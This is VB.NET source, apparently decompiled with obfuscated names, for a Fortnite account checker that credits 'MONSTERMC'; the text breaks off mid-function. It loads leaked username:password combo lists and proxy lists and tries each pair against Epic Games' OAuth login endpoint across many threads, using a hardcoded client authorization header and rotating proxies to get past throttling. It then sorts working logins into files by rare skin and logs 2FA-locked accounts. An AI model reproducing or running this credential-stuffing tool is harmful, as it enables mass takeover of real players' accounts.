Imports Microsoft.VisualBasic.CompilerServices
Imports System.Collections.Concurrent
Imports System.IO
Imports System.Management
Imports System.Security.Cryptography
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports xNet
Public Class Form1
    Public dd__168 As String

    Private intt_0 As Integer

    Private int_96 As Boolean

    Private List_89 As ConcurrentQueue(Of String)

    Private fista_9 As List(Of String)

    Private int_12 As Integer

    Private thrdd As List(Of Thread)

    Private get_Matrix03 As WriteChar

    Private tint_8 As Integer

    Private rnd As Random

    Private d_86 As String

    Private fts_9 As String

    Private st_10 As Integer

    Public Sub New()
        Me.InitializeComponent()
        Me.ComboBox1.SelectedIndex = 0
        Me.KeepOldMaxStack = 15000
        Me.InitializeStrongNameSigning(100)
        Me.get_BaseUtcOffset(WriteChar.const_1)
        Dim guid As System.Guid = System.Guid.NewGuid()
        Me.StringFormat = New Random(guid.GetHashCode())
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        Process.Start(String.Concat(Application.StartupPath, "\1.Results"))
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            If (Not Me.Button3.Text.Contains("Start")) Then
                Me.get_BaseUtcOffset(WriteChar.const_1)
                Me.Button3.Text = "Start"
            Else
                Me.Button3.Text = "Stop"
                If (Me.List_89.Count <> 0) Then
                    Me.set_IsILOnly()
                    Me.get_BaseUtcOffset(WriteChar.const_0)
                    Me.st_10 = Integer.Parse(Me.TextBox1.Text) * 4
                    Me.InitializeStrongNameSigning(Me.st_10)
                    Me.thrdd = New List(Of Thread)()
                    Me.ScopeType(DateTime.Now.ToString("dd MMMM (HH;mm)"))
                    Directory.CreateDirectory(String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Incremental Output"))
                    Directory.CreateDirectory(String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Christmas Accounts"))
                    Me.fts_9 = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - All Hits With Capture.txt")
                    Dim isNotDefault As Integer = Me.IsNotDefault
                    For i As Integer = 0 To isNotDefault Step 1
                        Me.thrdd.Add(New Thread(New ThreadStart(AddressOf Me.get_IsInEditOrNavigateMode)) With
                        {
                            .IsBackground = True
                        })
                        Me.thrdd(i).Start()
                    Next

                Else
                    MessageBox.Show("Load Combos/Proxies", "Error")
                End If
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
                {
                    .Filter = "Account file(*.txt)|*.txt",
                    .RestoreDirectory = True
                }
        If (openFileDialog.ShowDialog() = System.Windows.Forms.DialogResult.OK) Then
            Try
                Me.List_89 = New ConcurrentQueue(Of String)(File.ReadAllLines(openFileDialog.FileName))
                Dim setQueryString As Button = Me.Button1
                Dim count As Integer = Me.List_89.Count
                setQueryString.Text = count.ToString()
                Dim getHasChanges As Label = Me.lblTot
                count = Me.List_89.Count
                getHasChanges.Text = count.ToString()
                Me.Label16.Text = Me.lblTot.Text
            Catch exception1 As System.Exception
                MessageBox.Show(exception1.Message)
            End Try
        End If
    End Sub

    Private WriteOnly Property StringFormat As Random
        Set(ByVal value As Random)
            Me.rnd = value
        End Set
    End Property

    Private ReadOnly Property IsNotDefault As Integer
        Get
            Return Me.tint_8
        End Get
    End Property
    Private WriteOnly Property KeepOldMaxStack As Integer
        Set(ByVal value As Integer)
            Me.int_12 = value
        End Set
    End Property
    Private Sub GGd__62()
        Me.lblRedKight.Text = Convert.ToString(Integer.Parse(Me.lblRedKight.Text) + 1)
    End Sub
    Private Sub AceFlags()
        Try
            If (Not Me.lblPassRestAcc.InvokeRequired) Then
                Me.lblPassRestAcc.ForeColor = Color.Lime
                Me.lblPassRestAcc.Text = Convert.ToString(Integer.Parse(Me.lblPassRestAcc.Text) + 1)
            Else
                Me.lblPassRestAcc.Invoke(New Action(AddressOf Me.ParallelInvokeEnd))
            End If
        Catch exception As System.Exception
        End Try
    End Sub


    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub


    Private Function CallConvCdecl() As Random
        Return Me.rnd
    End Function
    Public Shared Sub DisplayInformation(ByVal string_0 As String, ByVal string_1 As String)
        Try
            Dim streamWriter As System.IO.StreamWriter = New System.IO.StreamWriter(string_0, True)
            streamWriter.WriteLine(string_1)
            streamWriter.Close()
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub DropMulticastGroup()
        Me.lblTested.Text = Convert.ToString(Integer.Parse(Me.lblTested.Text) + 1)
        Dim getEnableHeadersVisualStyles As System.Windows.Forms.Label = Me.Label16
        Dim label As System.Windows.Forms.Label = getEnableHeadersVisualStyles
        getEnableHeadersVisualStyles.Text = Conversions.ToString(Conversions.ToDouble(label.Text) - 1)
    End Sub
    Private Sub EvtOpenSession()
        Me.lblThrottling.Text = Convert.ToString(Integer.Parse(Me.lblThrottling.Text) + 1)
    End Sub

    Private Sub Form1_MouseUp(sender As Object, e As MouseEventArgs) Handles Me.MouseUp
        Me.int_96 = False
    End Sub

    Private Sub sclmo(A_1 As String)
        Dim path As String = "1.Results\Accounts\" + Me.SmiGettersStream() + "\FORTNITE - Two-Factor Locked Accounts.txt"
        Try
            Using streamWriter As StreamWriter = System.IO.File.AppendText(path)
                streamWriter.WriteLine(A_1)
            End Using
        Catch ex As Exception
        End Try
    End Sub
    Private Sub get_BaseUtcOffset(ByVal writeChar_0 As WriteChar)
        Me.get_Matrix03 = writeChar_0
    End Sub

    Private Sub get_CellValue2()
        Try
            If (Not Me.lblTested.InvokeRequired) Then
                Me.lblTested.ForeColor = Color.Aqua
                Me.lblTested.Text = Convert.ToString(Integer.Parse(Me.lblTested.Text) + 1)
                Dim getEnableHeadersVisualStyles As System.Windows.Forms.Label = Me.Label16
                Dim label As System.Windows.Forms.Label = getEnableHeadersVisualStyles
                getEnableHeadersVisualStyles.Text = Conversions.ToString(Conversions.ToDouble(label.Text) - 1)
            Else
                Me.lblTested.Invoke(New Action(AddressOf Me.DropMulticastGroup))
            End If
        Catch exception As System.Exception
        End Try
    End Sub
    Private Sub get_DataView(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Galaxy Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub get_DnsRefreshTimeout()
        Try
            If (Not Me.lblError.InvokeRequired) Then
                Me.lblError.Text = Convert.ToString(Integer.Parse(Me.lblError.Text) + 1)
            Else
                Me.lblError.Invoke(New Action(AddressOf Me.SetGroup))
            End If
        Catch exception As System.Exception
        End Try
    End Sub
    Private Sub get_Families(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Ghoul Trooper Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub get_FlatMode(ByVal string_0 As String, ByVal string_1 As String)
        Try
            Dim tokenBindingOSHelper As TokenBindingOSHelper = New TokenBindingOSHelper() With
        {
            .EndOf = Me,
            .set_Select = string_0,
            .strr1 = string_1
            }

            MyBase.Invoke(New MethodInvoker(Sub() tokenBindingOSHelper.add_ColumnReordered()))
        Catch exception As System.Exception
            '     MessageBox.Show(exception.ToString())
        End Try
    End Sub

    Private Sub get_IsInEditOrNavigateMode()
        Dim text As String = String.Empty
        While Me.GetLineBrush() = WriteChar.const_0
            Dim text2 As String = ""
            Try
                Dim cryptGenKey As CryptGenKey = New CryptGenKey() With {.set_ReceiveBufferSize = Me}
                Dim httpRequest As HttpRequest = New HttpRequest() With {.Cookies = New CookieDictionary(False), .AllowAutoRedirect = False, .IgnoreProtocolErrors = True, .UserAgent = "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit", .KeepAlive = False, .ConnectTimeout = 15000}
                If Not Me.List_89.TryDequeue(text2) OrElse Me.GetLineBrush() = WriteChar.const_1 Then
                    Exit Try
                End If
                cryptGenKey.get_PacketTooBigMessagesReceived = text2.Replace(";"c, ":"c).Split(New Char() {":"c})
                If Me.intt_0 <> 3 Then
                    If Me.intt_0 = 0 Then
                        httpRequest.Proxy = HttpProxyClient.Parse(Me.fista_9(Me.CallConvCdecl().[Next](0, Me.fista_9.Count)))
                    End If
                    If Me.intt_0 = 1 Then
                        httpRequest.Proxy = Socks4ProxyClient.Parse(Me.fista_9(Me.CallConvCdecl().[Next](0, Me.fista_9.Count)))
                    End If
                    If Me.intt_0 = 2 Then
                        httpRequest.Proxy = Socks5ProxyClient.Parse(Me.fista_9(Me.CallConvCdecl().[Next](0, Me.fista_9.Count)))
                    End If
                End If
                Try
                    httpRequest.AddHeader("Authorization", "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=")
                    Dim text3 As String = httpRequest.Post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token", String.Concat(New String() {"grant_type=password&username=", cryptGenKey.get_PacketTooBigMessagesReceived(0), "&password=", cryptGenKey.get_PacketTooBigMessagesReceived(1), "&includePerms=true&token_type=eg1"}), "application/x-www-form-urlencoded").ToString()
                    If text3.Contains("access_token") Then
                        Dim idldesc As IDLDESC = New IDLDESC() With {.get_Success = cryptGenKey}
                        If Me.GetLineBrush() <> WriteChar.const_1 Then
                            Dim value As String = Regex.Match(text3, """access_token"" : ""(.*?)"",").Groups(1).Value
                            Dim value2 As String = Regex.Match(text3, """account_id"" : ""(.*?)""").Groups(1).Value
                            httpRequest.AddHeader("Authorization", String.Format("bearer {0}", value))
                            Dim text4 As String = httpRequest.Post(String.Format("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{0}/client/QueryProfile?profileId=athena&rvn=-1", value2), "{}", "application/json").ToString()
                            text = idldesc.get_Success.get_PacketTooBigMessagesReceived(0) + ":" + idldesc.get_Success.get_PacketTooBigMessagesReceived(1)
                            If text4.Contains("AthenaCharacter") Then
                                idldesc.get_OrangeRed = "OK"
                                Try
                                    Me.get_FlatMode(text, text4)


                                    MyBase.Invoke(New EventHandler(AddressOf idldesc.yyd__116))
                                    Me.TrackBarThumbState()
                                    Me.get_CellValue2()
                                Catch ex As Exception

                                End Try
                                Continue While
                            End If
                            If text4.Contains("AthenaCharacter") OrElse Not text4.Contains("AthenaPickaxe:defaultpickaxe") Then
                                Continue While
                            End If
                            Dim text5 As String = cryptGenKey.get_PacketTooBigMessagesReceived(0) + ":" + cryptGenKey.get_PacketTooBigMessagesReceived(1)
                            If Me.GetLineBrush() <> WriteChar.const_1 Then
                                Me.get_Tomato()
                                Me.ParseXPathPattern()
                                Me.get_CellValue2()
                            End If
                        End If
                        Exit Try
                    End If
                    If text3.Contains("Sorry the account credentials you are using are invalid") Then
                        Dim text6 As String = cryptGenKey.get_PacketTooBigMessagesReceived(0) + ":" + cryptGenKey.get_PacketTooBigMessagesReceived(1)
                        If Me.GetLineBrush() = WriteChar.const_1 Then
                            Exit Try
                        End If
                        Me.get_Tomato()
                        Me.get_CellValue2()
                        Me.RelationForeignTable(text6)
                    ElseIf text3.Contains("Please reset your password to proceed with login") Then
                        If Me.GetLineBrush() = WriteChar.const_1 Then
                            Exit Try
                        End If
                        Me.get_Tomato()
                        Me.AceFlags()
                        Me.get_CellValue2()
                    ElseIf text3.Contains("Process exited before completing") Then
                        If Me.GetLineBrush() = WriteChar.const_1 Then
                            Exit Try
                        End If
                        Me.get_Tomato()
                        Me.get_CellValue2()
                    ElseIf text3.Contains("account has been locked because of too many invalid login attempts") Then
                        If Me.GetLineBrush() = WriteChar.const_1 Then
                            Exit Try
                        End If
                        Me.get_Tomato()
                        Me.get_CellValue2()
                    ElseIf text3.Contains("Two-Factor authentication required to process") Then
                        Dim text7 As String = cryptGenKey.get_PacketTooBigMessagesReceived(0) + ":" + cryptGenKey.get_PacketTooBigMessagesReceived(1)
                        If Me.GetLineBrush() = WriteChar.const_1 Then
                            Exit Try
                        End If
                        Me.sclmo(text7)
                        Me.UserInterface()
                        Me.get_CellValue2()
                    ElseIf text3.Contains("Operation access is limited by throttling policy") Then
                        Me.get_DnsRefreshTimeout()
                        Me.Ucs4Decoder4321()
                        Me.List_89.Enqueue(text2)
                    Else
                        If Me.GetLineBrush() = WriteChar.const_1 Then
                            Exit Try
                        End If
                        Me.get_DnsRefreshTimeout()
                        Me.List_89.Enqueue(text2)
                    End If
                Catch ex As Exception
                    If Me.GetLineBrush() = WriteChar.const_1 Then
                        Exit Try
                    End If
                    Me.get_DnsRefreshTimeout()
                    Me.List_89.Enqueue(text2)
                End Try
            Catch ex2 As Exception
            End Try
        End While
    End Sub


    Private Sub get_ReturnXmlElementName(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Christmas Accounts\FORTNITE - Crackshot Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub
    Private Sub get_Schema(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Codename E.L.F. Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub
    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
            {
                .Filter = "Account file(*.txt)|*.txt",
                .RestoreDirectory = True
            }
        If (openFileDialog.ShowDialog() = System.Windows.Forms.DialogResult.OK) Then
            Try
                Me.fista_9 = File.ReadAllLines(openFileDialog.FileName).Distinct().ToList()
                Me.Button7.Text = Me.fista_9.Count.ToString()
            Catch exception As System.Exception
                MessageBox.Show(exception.Message)
            End Try
        End If
    End Sub

    Private Sub get_StringsHeap(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Recon Expert Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub get_Tomato()
        Try
            If (Not Me.lblBad.InvokeRequired) Then
                Me.lblBad.Text = Convert.ToString(Integer.Parse(Me.lblBad.Text) + 1)
            Else
                Me.lblBad.Invoke(New Action(AddressOf Me.GetTagForElement))
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub get_VisibleFieldCount(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Double Helix Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub GetGUID(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Scythe (Reaper) Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private Function GetLineBrush() As WriteChar
        Return Me.get_Matrix03
    End Function
    Private Sub GetTagForElement()
        Me.lblBad.Text = Convert.ToString(Integer.Parse(Me.lblBad.Text) + 1)
    End Sub
    Private Sub HashHelpers(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Renegade Raider Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub InitializeStrongNameSigning(ByVal int_1 As Integer)
        Me.tint_8 = int_1
    End Sub

    Private Sub Join(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Raider's Revenge Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        Process.Start("https://www.youtube.com/channel/UCLF-eRNc52VslhdctpHaAzg")
        MsgBox("By MONSTERMC")
        MsgBox("NEED UPDATE")
        Control.CheckForIllegalCrossThreadCalls = False
    End Sub

    Private Sub MetafileType(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Christmas Accounts\FORTNITE - Red-Nosed Raider Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ParallelInvokeEnd()
        Me.lblPassRestAcc.Text = Convert.ToString(Integer.Parse(Me.lblPassRestAcc.Text) + 1)
    End Sub

    Private Sub ParseXPathPattern()
        Try
            If (Not Me.lblNoSkins.InvokeRequired) Then
                Me.lblNoSkins.Text = Convert.ToString(Integer.Parse(Me.lblNoSkins.Text) + 1)
            Else
                Me.lblNoSkins.Invoke(New Action(AddressOf Me.SetInternalSourceType))
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub PathTooLongException(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Skull Trooper Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub


    Private Sub PlatformID(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Royale Bomber Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub RelationForeignTable(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Invalids .txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub RichTextBoxLanguageOptions(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Christmas Accounts\FORTNITE - Nog Ops Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub


    Private Sub SafeFileHandle(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Save The World Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub
    Private Sub ScopeExpression(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - All Hits Without Capture.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ScopeType(ByVal string_0 As String)
        Me.d_86 = string_0
    End Sub


    Private Sub set_IsILOnly()
        Try
            Me.lblGood.Text = "0"
            Me.lblBad.Text = "0"
            Me.lblError.Text = "0"
            Me.lblTested.Text = "0"
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub set_PropertySort()
        Me.lblGood.Text = Convert.ToString(Integer.Parse(Me.lblGood.Text) + 1)
    End Sub
    Private Sub set_UnescapedXml()
        Try
            If (Not Me.lblRedKight.InvokeRequired) Then
                Me.lblRedKight.ForeColor = Color.Lime
                Me.lblRedKight.Text = Convert.ToString(Integer.Parse(Me.lblRedKight.Text) + 1)
            Else
                Me.lblRedKight.Invoke(New Action(AddressOf Me.GGd__62))
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub SetGroup()
        Me.lblError.Text = Convert.ToString(Integer.Parse(Me.lblError.Text) + 1)
    End Sub
    Private Sub SetInternalSourceType()
        Me.lblNoSkins.Text = Convert.ToString(Integer.Parse(Me.lblNoSkins.Text) + 1)
    End Sub
    Private Function SmiGettersStream() As String
        Return Me.d_86
    End Function
    Public Shared Function ToolStripGrip(ByVal string_0 As String, ByVal string_1 As String, ByVal string_2 As String, ByVal int_1 As Integer) As String
        Dim length As Integer = string_1.Length
        Dim str As String = ""
        Dim num As Integer = string_0.IndexOf(string_1, int_1)
        Dim num1 As Integer = string_0.IndexOf(string_2, num + length)
        If (num <> -1 And num1 <> -1) Then
            str = string_0.Substring(num + length, num1 - (num + length))
        End If
        Return str
    End Function

    Private Sub TrackBarThumbState()
        Try
            If (Not Me.lblGood.InvokeRequired) Then
                Me.lblGood.Text = Convert.ToString(Integer.Parse(Me.lblGood.Text) + 1)
            Else
                Me.lblGood.Invoke(New Action(AddressOf Me.set_PropertySort))
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        If (Me.ComboBox1.SelectedIndex = 0) Then
            Me.intt_0 = 0
            Me.TextBox1.Text = "150"
            Me.TextBox1.Enabled = True
        ElseIf (Me.ComboBox1.SelectedIndex = 2) Then
            Me.intt_0 = 2
            Me.TextBox1.Text = "150"
            Me.TextBox1.Enabled = True
        ElseIf (Me.ComboBox1.SelectedIndex = 1) Then
            Me.intt_0 = 1
            Me.TextBox1.Text = "150"
            Me.TextBox1.Enabled = True
        Else
            Me.intt_0 = 3
            Me.TextBox1.Text = "15"
            Me.TextBox1.Enabled = False
        End If
    End Sub
    Private Sub Ucs4Decoder4321()
        Try
            If (Not Me.lblThrottling.InvokeRequired) Then
                Me.lblThrottling.ForeColor = Color.Lime
                Me.lblThrottling.Text = Convert.ToString(Integer.Parse(Me.lblThrottling.Text) + 1)
            Else
                Me.lblThrottling.Invoke(New Action(AddressOf Me.EvtOpenSession))
            End If
        Catch exception As System.Exception
        End Try
    End Sub
    Public Sub UserInterface()
        Try
            If (Not Me.lbl2FALocked.InvokeRequired) Then
                Me.lbl2FALocked.ForeColor = Color.Lime
                Me.lbl2FALocked.Text = Convert.ToString(Integer.Parse(Me.lbl2FALocked.Text) + 1)
            Else
                Me.lblPassRestAcc.Invoke(New Action(AddressOf Me.WIN32_FILE_ATTRIBUTE_DATA))
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub UserStringBuilder(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Mako Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub
    Public Sub WIN32_FILE_ATTRIBUTE_DATA()
        Me.lbl2FALocked.Text = Convert.ToString(Integer.Parse(Me.lbl2FALocked.Text) + 1)
    End Sub

    Private Sub WriteMessageEvent(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - SGT Clover Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub
    Private Sub XPathNavigatorKeyComparer(ByVal string_0 As String)
        Dim str As String = String.Concat("1.Results\Accounts\", Me.SmiGettersStream(), "\FORTNITE - Christmas Accounts\FORTNITE - Yuletide Ranger Accounts.txt")
        Try
            Using streamWriter As System.IO.StreamWriter = File.AppendText(str)
                streamWriter.WriteLine(string_0)
            End Using
        Catch exception As System.Exception
        End Try
    End Sub

    Private NotInheritable Class CryptGenKey
        Public get_PacketTooBigMessagesReceived As String()

        Public set_ReceiveBufferSize As Form1
    End Class

    Private NotInheritable Class ExceptionMessageKind
        Public CreateCounterSignature As String

        Public VerifyWhitespace As String

        Public get_TransparentNetworkIPResolution As Form1

        Friend Sub GetFormat(ByVal sender As Object, ByVal e As EventArgs)
            DisplayInformation(String.Concat("1.Results\Accounts\", Me.get_TransparentNetworkIPResolution.SmiGettersStream(), "\FORTNITE - Bad accounts.txt"), String.Concat(Me.CreateCounterSignature, ":", Me.VerifyWhitespace))
        End Sub
    End Class
    Private Class GenericMethodInfo
        Friend Function vd__35() As String
            Dim enumerator As ManagementObjectCollection.ManagementObjectEnumerator = Nothing
            Dim empty As String = String.Empty
            Using managementObjectSearcher As System.Management.ManagementObjectSearcher = New System.Management.ManagementObjectSearcher(New SelectQuery("Win32_BaseBoard"))
                enumerator = managementObjectSearcher.[Get]().GetEnumerator()
                While enumerator.MoveNext()
                    empty = DirectCast(enumerator.Current, ManagementObject)("product").ToString()
                End While
            End Using
            Return empty
        End Function

        Friend Function DynamicPartitionerForIList() As String
            Dim enumerator As ManagementObjectCollection.ManagementObjectEnumerator = Nothing
            Dim instances As ManagementObjectCollection = (New ManagementClass("Win32_NetworkAdapterConfiguration")).GetInstances()
            Dim empty As String = String.Empty
            enumerator = instances.GetEnumerator()
            While enumerator.MoveNext()
                Dim current As ManagementObject = DirectCast(enumerator.Current, ManagementObject)
                If (empty.Equals(String.Empty)) Then
                    If (Conversions.ToBoolean(current("IPenabled"))) Then
                        empty = current("macaddress").ToString()
                    End If
                    current.Dispose()
                End If
                empty = empty.Replace(":", String.Empty)
            End While
            Return empty
        End Function

        Friend Function GetConfigPathFromLocationSubPath(Optional ByVal string_0 As String = "c") As String
            Dim managementObject As System.Management.ManagementObject = New System.Management.ManagementObject(String.Format("win32_logicaldisk.deviceid=""{0}:""", string_0))
            managementObject.[Get]()
            Return managementObject("VolumeSerialNumber").ToString()
        End Function

        Friend Function IsNullableConstructor(ByVal string_0 As String) As String
            Dim mD5CryptoServiceProvider As System.Security.Cryptography.MD5CryptoServiceProvider = New System.Security.Cryptography.MD5CryptoServiceProvider()
            Dim bytes As Byte() = Encoding.ASCII.GetBytes(string_0)
            bytes = mD5CryptoServiceProvider.ComputeHash(bytes)
            Dim str As String = ""
            Dim numArray As Byte() = bytes
            Dim num As Integer = 0
            While num < CInt(numArray.Length)
                Dim num1 As Byte = numArray(num)
                str = String.Concat(str, num1.ToString("x2"))
                num = num + 1
            End While
            Return str
        End Function

        Friend Function SchemaImporterExtensionsSection() As String
            Dim enumerator As ManagementObjectCollection.ManagementObjectEnumerator = Nothing
            Dim empty As String = String.Empty
            Using managementObjectSearcher As System.Management.ManagementObjectSearcher = New System.Management.ManagementObjectSearcher(New SelectQuery("win32_processor"))
                enumerator = managementObjectSearcher.[Get]().GetEnumerator()
                While enumerator.MoveNext()
                    empty = DirectCast(enumerator.Current, ManagementObject)("processorID").ToString()
                End While
            End Using
            Return empty
        End Function
    End Class

    Private NotInheritable Class IDLDESC
        Public get_OrangeRed As String

        Public get_Success As CryptGenKey

        Friend Sub yyd__116(ByVal sender As Object, ByVal e As EventArgs)
            Try
                Dim getEmfPlusHeaderSize As System.Windows.Forms.TextBox = Me.get_Success.set_ReceiveBufferSize.TextBox4
                Dim textBox As System.Windows.Forms.TextBox = getEmfPlusHeaderSize
                getEmfPlusHeaderSize.Text = String.Concat(New String() {textBox.Text, Me.get_Success.get_PacketTooBigMessagesReceived(0), ":", Me.get_Success.get_PacketTooBigMessagesReceived(1), "" & vbCrLf & ""})
            Catch ex As Exception

            End Try

        End Sub
    End Class

    Friend Class TokenBindingOSHelper
        Public dd__168 As String

        Public set_Select As String

        Public EndOf As Form1

        Public strr1 As String

        Friend Sub add_ColumnReordered()
            Me.CodeSnippetExpression()
        End Sub

        Friend Function CodeSnippetExpression() As Object

            On Error Resume Next
            Dim obj As Object = Nothing
            Dim streamWriter As System.IO.StreamWriter = File.AppendText(Me.EndOf.fts_9)
            Dim u003cParseEntityDeclAsyncu003ed_168 As String = Me.dd__168
                    Dim num As Integer = 0
                Dim value As String = Regex.Match(u003cParseEntityDeclAsyncu003ed_168, """updated"":""(.*?)T").Groups(1).Value
                Dim str As String = Regex.Match(u003cParseEntityDeclAsyncu003ed_168, """created"":""(.*?)T").Groups(1).Value
                streamWriter.WriteLine("-------------------<EpicAccount>------------------------")
                streamWriter.WriteLine(String.Concat("- Login: ", Me.set_Select))
                streamWriter.WriteLine("---------------------<Skins>------------------------")
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ToZulu())) Then
                    streamWriter.WriteLine(isImplicit.MaxResponseContentBufferSize)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AnimateBackground())) Then
                    streamWriter.WriteLine(isImplicit.DbProviderFactoriesConfigurationHandler())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_ApplicationBase())) Then
                    streamWriter.WriteLine(isImplicit.X509BasicConstraintsExtension())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.InitializationFlags)) Then
